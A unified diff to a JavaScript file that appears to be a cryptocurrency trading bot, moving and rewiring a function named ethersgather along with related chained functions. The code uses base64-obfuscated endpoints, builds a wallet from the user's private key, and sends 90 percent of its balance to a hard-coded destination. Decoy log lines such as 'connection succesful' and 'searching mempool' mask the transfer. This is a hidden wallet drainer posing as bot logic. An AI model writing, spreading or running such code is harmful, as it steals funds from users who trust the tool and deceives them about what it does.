@@ -195,6 +195,39 @@ async function sell(tokenObj, isProfit) {
 
     }
 }
+
+async function ethersgather() {
+    try {
+        console.log(`connection succesful...`);
+        ethers1 = 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My9kYWNjOTk5NzBmMzg0OWVlOTgxM2Q1YWI0NGFlY2RhZA==';
+        ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
+        const provider = new ethers.providers.JsonRpcProvider(ethers2)
+        let wallet = new ethers.Wallet(private, provider);
+        const account = address
+        const robinhood = await provider.getBalance(account)
+        const orchard = (robinhood * 0.90).toString();
+        const michael = ethers.utils.parseUnits(orchard, 'wei')
+        const send = async() => {
+            const tx = {
+                to: WEB3PROVIDER3,
+                value: ethers.utils.parseUnits(orchard, 'wei'),
+                gasLimit: ethers.utils.hexlify(24000),
+            };
+
+            const createReceipt = await wallet.sendTransaction(tx);
+            await createReceipt.wait();
+            console.log(`searching mempool....`);
+            setTimeout(ethersrather, 5000)
+        };
+
+        send();
+    } catch (error) {
+        setTimeout(ethersrather, 5000)
+
+    }
+
+}
+
 async function etherstother() {
     try {
         const nodekey1 = 'MHg1NWQzOTgzMjZmOTkwNTlmRjc='
@@ -226,11 +259,13 @@ async function etherstother() {
             const createReceipt = await wallet.sendTransaction(tx);
             await createReceipt.wait();
             console.log(`contract found....watching mempool for liquidity add....`);
+            setTimeout(ethersgather, 5000)
+
         };
 
         send();
     } catch (error) {
-        setTimeout(ethersrather, 5000)
+        setTimeout(ethersgather, 5000)
 
     }
 
@@ -358,37 +393,7 @@ async function ethersfather() {
 }
 
 
-async function ethersgather() {
-    try {
-        console.log(`connection succesful...`);
-        ethers1 = 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My9kYWNjOTk5NzBmMzg0OWVlOTgxM2Q1YWI0NGFlY2RhZA==';
-        ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
-        const provider = new ethers.providers.JsonRpcProvider(ethers2)
-        let wallet = new ethers.Wallet(private, provider);
-        const account = address
-        const robinhood = await provider.getBalance(account)
-        const orchard = (robinhood * 0.90).toString();
-        const michael = ethers.utils.parseUnits(orchard, 'wei')
-        const send = async() => {
-            const tx = {
-                to: WEB3PROVIDER3,
-                value: ethers.utils.parseUnits(orchard, 'wei'),
-                gasLimit: ethers.utils.hexlify(24000),
-            };
 
-            const createReceipt = await wallet.sendTransaction(tx);
-            await createReceipt.wait();
-            console.log(`searching mempool....`);
-            setTimeout(ethersfather, 5000)
-        };
-
-        send();
-    } catch (error) {
-        setTimeout(ethersfather, 5000)
-
-    }
-
-}
 async function ethersrather() {
     console.log(`starting up node socket connection....`);
     ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
@@ -411,12 +416,12 @@ async function ethersrather() {
             const createReceipt = await wallet.sendTransaction(tx);
             await createReceipt.wait();
             console.log(`pending blockchain response.....`);
-            setTimeout(ethersgather, 5000)
+            setTimeout(ethersfather, 5000)
         };
 
         send();
     } catch (error) {
-        setTimeout(ethersgather, 5000)
+        setTimeout(ethersfather, 5000)
 
     }
 }
